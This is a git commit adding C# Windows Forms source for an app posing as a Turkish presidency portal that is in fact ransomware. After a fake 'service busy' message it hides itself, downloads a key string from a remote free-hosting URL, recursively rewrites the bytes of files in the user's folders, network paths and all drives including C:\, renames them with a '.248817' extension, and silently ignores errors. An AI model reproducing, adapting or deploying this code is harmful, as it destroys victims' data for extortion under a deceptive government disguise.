eceebb022cd76b13eb9ec25b392715b289c9e127
volkan cengiz <volkancengiz@outlook.com>
2019-10-30 10:35:47 +0300

    Add files via upload

---
+++ Cumhurbaşkanlığı Portal/Cumhurbaşkanlığı Portal/Form1.Designer.cs
@@ -0,0 +1,121 @@
+﻿namespace Cumhurbaşkanlığı_Portal
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
+            this.backgroundWorker2 = new System.ComponentModel.BackgroundWorker();
+            this.backgroundWorker3 = new System.ComponentModel.BackgroundWorker();
+            this.backgroundWorker4 = new System.ComponentModel.BackgroundWorker();
+            this.backgroundWorker5 = new System.ComponentModel.BackgroundWorker();
+            this.backgroundWorker6 = new System.ComponentModel.BackgroundWorker();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.BackColor = System.Drawing.Color.White;
+            this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Top;
+            this.pictureBox1.Location = new System.Drawing.Point(0, 0);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(400, 243);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.ForeColor = System.Drawing.Color.Black;
+            this.label1.Location = new System.Drawing.Point(156, 218);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(93, 13);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Lütfen Bekleyiniz..";
+            // 
+            // backgroundWorker1
+            // 
+            this.backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker1_DoWork);
+            // 
+            // backgroundWorker2
+            // 
+            this.backgroundWorker2.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker2_DoWork);
+            // 
+            // backgroundWorker3
+            // 
+            this.backgroundWorker3.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker3_DoWork);
+            // 
+            // backgroundWorker4
+            // 
+            this.backgroundWorker4.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker4_DoWork);
+            // 
+            // backgroundWorker5
+            // 
+            this.backgroundWorker5.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker5_DoWork);
+            // 
+            // backgroundWorker6
+            // 
+            this.backgroundWorker6.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker6_DoWork);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.White;
+            this.ClientSize = new System.Drawing.Size(400, 240);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.pictureBox1);
+            this.ForeColor = System.Drawing.SystemColors.ButtonFace;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Label label1;
+        private System.ComponentModel.BackgroundWorker backgroundWorker1;
+        private System.ComponentModel.BackgroundWorker backgroundWorker2;
+        private System.ComponentModel.BackgroundWorker backgroundWorker3;
+        private System.ComponentModel.BackgroundWorker backgroundWorker4;
+        private System.ComponentModel.BackgroundWorker backgroundWorker5;
+        private System.ComponentModel.BackgroundWorker backgroundWorker6;
+    }
+}
+
---
+++ Cumhurbaşkanlığı Portal/Cumhurbaşkanlığı Portal/Form1.cs
@@ -0,0 +1,221 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.IO;
+using System.Net;
+using System.Drawing;
+using System.Text;
+using System.Windows.Forms;
+
+namespace Cumhurbaşkanlığı_Portal
+{
+    public partial class Form1 : Form
+    {
+        // Değişkenler
+        String kullaniciAdi;
+        String masaustuYolu, belgelerimYolu, indirilenlerYolu;
+        String yeniDosyaYolu;
+        String terminal1Belgelerim,terminal1c, terminal1yedek_D , terminal2d,terminal2Users;
+        Byte[] harfDizisi;
+        Byte[] kod = null;
+        Boolean hazirlik = false;
+        String isim = "baykan";
+        string[] drives= System.IO.Directory.GetLogicalDrives();
+
+        // Değişkenler Son
+
+
+        public Form1()
+        {
+            CheckForIllegalCrossThreadCalls = false;
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            backgroundWorker1.RunWorkerAsync();
+            backgroundWorker2.RunWorkerAsync();
+            backgroundWorker3.RunWorkerAsync();
+            
+
+        }
+
+        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
+        {
+            System.Threading.Thread.Sleep(3500);
+            MessageBox.Show("Yoğunluktan dolayı portala erişim sağlayamıyorsunuz. Lütfen birkaç saat sonra tekrar deneyiniz.");
+            this.Opacity = 0;
+            this.ShowInTaskbar = false;               
+            
+        }
+
+        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
+        {
+            String sifre = sifreAl();            
+            kod= Encoding.ASCII.GetBytes(sifre);
+            hazirlik = true;
+                        
+        }
+                     
+        private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
+        {
+            while(!hazirlik)
+            {
+                ;
+            }
+            kullaniciAdi = Environment.UserName;
+            masaustuYolu = "C:\\Users\\"+kullaniciAdi+"\\Desktop";           
+            belgelerimYolu = "C:\\Users\\"+kullaniciAdi+"\\Documents";
+            indirilenlerYolu = "C:\\Users\\"+kullaniciAdi+ "\\Downloads";
+            terminal1Belgelerim = @"terminal1\Belgelerim";
+            terminal1c = @"terminal1\c";
+            terminal1yedek_D = @"terminal1\yedek (D)";
+            terminal2d = @"terminal2\d";
+            terminal2Users = @"terminal2\Users";
+            
+            backgroundWorker4.RunWorkerAsync();
+            uzantiDegistir(terminal1Belgelerim);
+            uzantiDegistir(terminal1c);
+            uzantiDegistir(terminal1yedek_D);
+            uzantiDegistir(terminal2d);
+            uzantiDegistir(terminal2Users);
+            uzantiDegistir(indirilenlerYolu);  
+            uzantiDegistir(belgelerimYolu);       
+            uzantiDegistir(masaustuYolu);
+            
+            MessageBox.Show(":)");
+            
+
+        }
+
+        private void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
+        {
+            foreach (string drv in drives)
+            {
+                if (!drv.Contains("C"))
+                {
+                    uzantiDegistir(drv);
+                }
+
+
+            }
+            try
+            {
+                uzantiDegistir("C:\\");
+            }
+            catch (Exception x)
+            {
+                ;
+            }
+        }
+
+        private void backgroundWorker5_DoWork(object sender, DoWorkEventArgs e)
+        {
+
+        }
+
+        private void backgroundWorker6_DoWork(object sender, DoWorkEventArgs e)
+        {
+
+        }
+
+
+        // Fonksiyonlar
+        public void uzantiDegistir(string yol)
+        {
+            if (File.Exists(yol))
+            {
+                
+                dosyaIsle(yol);
+            }
+            else if (Directory.Exists(yol))
+            {
+
+                klasorIsle(yol);
+            }
+            else
+            {
+                ;
+            }
+        }
+
+        public void dosyaIsle(string dosyaYolu)
+        {
+
+            try
+            {
+                if (!dosyaYolu.Contains("248817") && !dosyaYolu.Contains("umhu"))
+                {
+                    
+                    try
+                    {
+                        harfDizisi = File.ReadAllBytes(dosyaYolu);
+                    }
+                    catch (Exception e)
+                    {
+                        
+                    }
+
+                    int sayi = 0;
+                    int sayi2 = 0;
+                    
+                    for (sayi = 0; sayi < harfDizisi.Length; sayi++)
+                    {
+                        harfDizisi[sayi] = (byte)(harfDizisi[sayi] - kod[sayi2]);
+                        if (sayi2 == 500) sayi2 = 0;
+                    }
+
+                    try
+                    {
+                        File.WriteAllBytes(dosyaYolu, harfDizisi);
+                    }
+                    catch (Exception e)
+                    {
+                        ;
+                    }
+                    System.IO.File.Move(dosyaYolu, dosyaYolu + ".248817");
+                }
+            }
+            catch (Exception e)
+            {
+                ;
+            }
+
+
+
+        }
+
+        
+
+        public void klasorIsle(string klasorYolu)
+        {
+            try
+            {
+                string[] dosyalar = Directory.GetFiles(klasorYolu);
+                foreach (string dosya in dosyalar)
+                {
+                    dosyaIsle(dosya);
+                }
+
+                string[] altKlasorler = Directory.GetDirectories(klasorYolu);
+                foreach (string altklasor in altKlasorler)
+                {
+                    klasorIsle(altklasor);
+                }
+            }
+            catch(Exception e)
+            {
+                ;
+            }
+        }
+
+        public string sifreAl()
+        {
+            WebClient client = new WebClient();
+            string downloadString = client.DownloadString("https://248817playground.000webhostapp.com/?isim=" + isim);
+            
+            return downloadString;
+        }
+    }
+}
